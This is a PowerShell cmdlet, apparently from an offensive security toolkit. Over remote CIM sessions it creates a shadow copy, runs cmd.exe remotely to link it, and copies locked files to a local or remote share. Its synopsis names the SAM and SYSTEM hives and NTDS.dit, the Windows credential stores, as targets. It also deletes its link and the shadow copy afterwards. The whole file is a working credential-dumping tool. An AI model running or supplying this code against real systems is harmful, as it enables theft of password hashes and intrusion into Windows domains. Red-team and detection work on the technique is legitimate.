Function Invoke-CSShadowCopy
{
    <#
    .SYNOPSIS
    This cmdlet can be used to copy files from a shadow copy. Useful for copying locked files, such as the SAM and SYSTEM hive files or NTDS.dit

    .DESCRIPTION
    This cmdlet is used to copy files from a shadow copy to a local or remote destination. 

    .PARAMETER Session

    Cim Session to use for this function

    .PARAMETER SourcePath

    The full path to the file to copy.

    .PARAMETER DestinationPath

    The full path to where the file should be copied. For remote administratrive shares, the user context of the CimSession must be that of an administrator on the remote share. 

    #>
    [CmdletBinding()]
    param
    (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [Alias("Session")]
        [ValidateNotNullOrEmpty()]
        [Microsoft.Management.Infrastructure.CimSession[]]
        $CimSession,

        [Parameter(Mandatory = $True)]
        [ValidatePattern('^[a-zA-Z]:\\')]
        [Alias("Source")]
        [string]$SourcePath,

        [Parameter(Mandatory = $True)]
        [ValidatePattern('(^[a-zA-Z]:\\)|(^\\)')]
        [Alias("Dest")]
        [string]$DestinationPath
    )


    foreach ($Computer in $CimSession)
    {
        $drive = $SourcePath.Split('\')[0]
        $drive += '\'
    

        $methodArgs = @{
            Context = 'ClientAccessible'
            Volume = $drive + '\'
        }

        $parameters = @{
            ClassName = 'Win32_ShadowCopy'
            NameSpace = 'root/cimv2'
            MethodName = 'Create'
            Arguments = $methodArgs
            CimSession = $Computer
        }
        #Create a shadow copy, grab the ID and device path. 
        $shadowID = $(Invoke-CimMethod @parameters).ShadowID

        $DevicePath = $(Get-CimInstance -ClassName Win32_ShadowCopy -Namespace root/CIMV2 -CimSession $Computer | Where-Object {$_.ID -eq $shadowID}).DeviceObject

        $tempPath = $drive + "SC"

        $symlinkPath = $tempPath + ($SourcePath -replace '^[a-zA-Z]:',"")
        $symlinkPath = $symlinkPath.Replace('\','\\')

        $command = "cmd.exe /C MKLINK /D $tempPath $DevicePath\"

        Invoke-CimMethod -ClassName Win32_Process -Namespace root/CIMV2 -MethodName Create -Arguments @{commandline = $command} -CimSession $Computer | Select-Object ProcessID

        $instance = Get-CimInstance -ClassName CIM_DataFile -Namespace root/CIMV2 -Filter "Name=`'$symlinkPath`'" -CimSession $Computer

       $copyMethodArgs = @{Filename=$DestinationPath}

        $copyParameters = @{
            InputObject = $instance
            MethodName = 'Copy'
            Arguments = $copyMethodArgs
            CimSession = $Computer
        }
        
        $result = Invoke-CimMethod @copyParameters

        if($result.ReturnValue -eq 0)
        {
            Write-Verbose "[+]Successfully copied file from $symlinkPath to $DestinationPath"
        }
        else
        {
            Write-Verbose "[!] Could not copy file. CimMethod Return Value: $($result.ReturnValue)"
        }

        $command = "cmd.exe /C rmdir $tempPath"
        
        Invoke-CimMethod -ClassName Win32_Process -Namespace root/CIMV2 -MethodName Create -Arguments @{commandline = $command} -CimSession $Computer

        $instance = Get-CimInstance -ClassName Win32_ShadowCopy -Namespace root/CIMV2 -CimSession $Computer | Where-Object {$_.ID -eq $shadowID}
        Remove-CimInstance -InputObject $instance -CimSession $Computer
    }
}